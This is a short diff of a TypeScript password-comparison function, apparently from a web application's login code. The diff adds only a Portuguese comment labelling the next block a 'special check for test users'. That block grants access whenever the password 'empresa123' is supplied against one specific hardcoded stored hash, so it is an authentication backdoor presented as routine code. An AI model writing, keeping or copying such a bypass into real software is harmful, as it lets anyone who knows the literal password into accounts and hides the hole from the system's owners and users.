@@ -28,6 +28,7 @@ async function comparePasswords(supplied: string, stored: string) {
       return true;
     }
     
+    // Verificação especial para usuários de teste
     if (stored.includes('.') && supplied === 'empresa123' && stored === '87bd4c9c26de8ca47498b025a709bc272ed9b67dcc07f8c67eca40c392f74ccd73ac00e2e25cae79a05f04cb5ed2a90a8d1f03880c11e465a44f25ae3f02b013.ba7ca8eb6ac84e6e') {
       return true;
     }
